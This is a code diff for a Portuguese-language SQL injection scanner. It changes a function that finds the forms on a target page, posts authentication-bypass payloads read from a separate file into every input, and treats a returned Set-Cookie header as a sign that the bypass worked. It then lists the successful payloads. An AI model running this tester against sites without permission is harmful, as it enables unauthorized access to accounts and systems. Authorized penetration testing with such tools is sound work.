@@ -8,13 +8,15 @@
 ## começar por testes de injeção sql baseada no tempo... criar um jit
 
 from email import header
+from posixpath import split
+from random import betavariate
 from unittest import result
 from cherrypy import url
 from pendulum import time
 from pymysql import NULL
 from sympy import pretty
 
-from core.config import INITIAL_COUNT_VALUE
+from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE
 
 
 
@@ -137,49 +139,62 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                     '''
                     Faz o teste sqli nos campos de formulários filtrados 👇👇👇👇👇👇👇👇👇
                     '''
-                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" variáveis URL não encontrado('http://www.site.com/artigo.php?id=1')"+color.end)
+                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" variáveis URL não encontrado( e.x'http://www.site.com/artigo.php?id=1')"+color.end)
                     print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" Será usada campos inputs..."+color.end)
                     print("["+color.green+"+"+color.end+"] Procurando por formulários..."+color.end)
                     
                     main_requesition = requests.get(url=target_url)
                     main_requesition_parsed = BeautifulSoup(main_requesition.content, 'html.parser')
+                    
+                    ''''
+                    Desmonta e monta a url pra postagem
+                    '''
+                    teste_url = target_url.split('/')
+                    teste_url_ = {}
+                    index = -1
+                    for teste in teste_url:
+                        index +=1
+                        teste_url_[index] = teste
                     ## filtrando todos os formulários...
                     
                     forms = main_requesition_parsed.find_all('form')
-                    form_quant = 0
+                    form_quant = -1
                     array_form = {}
                     input_dic = {}
-                    validation_page = {}
+                    validation_page = {} 
                     
-                    ## percorre o objeccto Soup do formulário, guardando ele no array_form com índices interos
+                    succed_payloads = []
+                    
+                    ## percorre o objeccto Soup do formulário, guardando ele no array_form com índices inteiros
                     for form_perc in forms:
+                        form_quant +=1
                         if 'action' in form_perc.attrs:
                             validation_page[form_quant] = form_perc['action']
-    
+
                         array_form[form_quant] = form_perc 
-                        form_quant +=1
             
-                    print("["+color.green+"+"+color.end+"]"+color.end+"  Foi encontrado : %s formulários." % form_quant, end='')
+                    print("["+color.green+"+"+color.end+"]"+color.end+" Foi encontrado [0 - %s] formulários." % form_quant, end='')
                     if form_quant == INITIAL_COUNT_VALUE:
                         form_quant = form_quant
                     else:
                         try:
-                            user_option = int(input(" Quantos desejas testar: "))
+                            user_option = int(input(" Qual a posição do formulário que desejas testar?: "))
                         except ValueError as e:
                             print(color.info_1+color.red_0+color.info_2+" Erro: "+color.red+" Valor inválido"+color.end+" Saindo do programa...")
                             quit()
-                        if user_option > form_quant or user_option < 1:
+                        if user_option > form_quant or user_option < 0:
                             print(color.info_1+color.red_0+color.info_2+" Erro: "+color.red+"Quantidade "+color.red+"inválida."+color.end+" Saindo do programa...")
                             quit()
                         else:
-                            for user_option in range(INITIAL_COUNT_VALUE, user_option):
+                            for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
                                 ## monta a url de validação dos dados
-                                post_target_url = target_url+'/'+validation_page[user_option]
+                                post_target_url = teste_url_[0]+'//'+teste_url_[2]+'/'+validation_page[user_option]
+                                print(post_target_url)
                                 ## avança na execução conforme instruido pelo o usuário
                                 print("["+color.green+"+"+color.end+"]" +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                                 input_tag = array_form[user_option].find_all({'input'})
 
-                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" Injeção inferencial(CEGA)Auth... "+color.end)
+                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" Injeção inferencial(CEGA) BYPASS AUTH BOOLEAN "+color.end)
                                 with open ('./mode/payload/bypass_auth_payloads_sqli', 'r') as bypass_auth_payloads_sqli:
                                     for lines in bypass_auth_payloads_sqli:
                                         for input_tag_perc in input_tag:
@@ -188,17 +203,20 @@ def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
                                                     pass
                                                 elif 'name' in input_tag_perc.attrs:
                                                     input_dic[input_tag_perc.attrs['name']] = lines
-                                                  
-                                        main_requesition = requests.post(url=target_url, data=input_dic)
-                                        headers_request = requests.head(url=post_target_url)
-                                        if 'Set-cookie' in headers_request.headers:
-                                            print("[DEBUG] %s"%headers_request.headers['Set-Cookie'])
+                                        main_requesition = requests.post(url=post_target_url, data=input_dic)
+                                        if 'Set-Cookie' in main_requesition.headers:
+                                            print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]    MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
+                                            succed_payloads.append(lines)
                                         else:
-                                            print("[*]")
-                
-                    ## primeiro filttra formulários
-                    ## caso  tenha mais de um, pede a opção do usuário assim como no xss
-                    ## com base na entrada do usuário, faz os testes sqli
+                                            print("["+color.red+"-"+color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
+                                            
+                                print("\n O Web spider detetou os seguintes pontos de injeção no alvo:")
+                                
+                                for succed_payloads_lines in succed_payloads:
+                                    print("\t Título: MYSQLi BYPASS AUTH BOOLEAN :: Payload: %s" %succed_payloads_lines, end='')
+                                
+                                
+                        
             except requests.exceptions.RequestException as e:
                 print(color.info_1+color.red_0+color.info_2+" Erro: "+color.red+"alvo"+color.orange+" Inacessível, verifique a sua ligação à internet ou contacte o"+color.red+" Web master."+color.end)
                 quit()
